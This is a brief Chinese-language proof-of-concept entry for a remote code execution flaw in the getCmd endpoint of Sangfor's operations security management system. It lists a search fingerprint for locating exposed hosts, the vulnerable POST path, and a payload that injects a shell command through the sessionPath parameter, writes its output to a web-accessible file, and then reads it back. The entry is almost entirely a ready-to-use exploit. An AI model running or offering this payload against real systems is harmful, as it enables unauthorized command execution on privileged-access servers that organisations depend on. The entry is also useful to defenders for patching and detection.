# 深信服运维安全管理系统getCmd存在远程代码执行漏洞

深信服 ｜ 命令执行 ｜ —
- **指纹**：`body="/fort/login"`
- **请求**：`POST /isomp-protocol/protocol/getCmd HTTP/1.1`

**Payload**
```
sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/qwer.txt;&sid=1
GET /isomp-protocol/qwer.txt HTTP/1.1
Host:
```
- **响应特征**：200